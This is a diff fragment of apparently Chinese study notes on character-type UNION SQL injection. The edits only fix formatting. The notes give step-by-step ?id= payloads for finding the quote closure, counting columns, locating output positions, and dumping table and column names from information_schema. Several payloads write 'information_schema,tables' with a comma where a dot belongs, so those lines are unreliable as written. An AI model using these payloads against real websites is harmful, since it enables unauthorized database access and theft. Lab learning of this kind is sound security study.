@@ -2198,7 +2198,7 @@ union注入字符型先判断一下闭合方式
 ?id=1&#39;union --+
 step1 确定列数注意前后查询的列数必须一致
 用group by二分法
-?id=1&#39;group by 3--+
+?id=1&#39;group by 3 --+
 step2 查询回显位假设为3列后
 ?id=1&#39;union select 1,2,3 --+
 让第1行不存在，显示2,3行
@@ -2210,7 +2210,7 @@ step3 查询表名和列名查表名
 过滤数据库的表名，即table_schema为库名的行
 ?id=-1&#39;union select 1,table_name,3 from information_schema,tables where table_schema=&#39;库名&#39;--+
 把查询信息放到一行回显
-&#96;&#96;?id&#x3D;-1’union select 1,group_concat(table_name),3 from information_schema,tables where table_schema&#x3D;’库名’–+&#96;
+?id=-1&#39;union select 1,group_concat(table_name),3 from information_schema,tables where table_schema=&#39;库名&#39;--+
 查列名
 ?id=-1&#39;union select 1,column_name,3 from information_schema,columns --+
 把查询信息放到一行回显
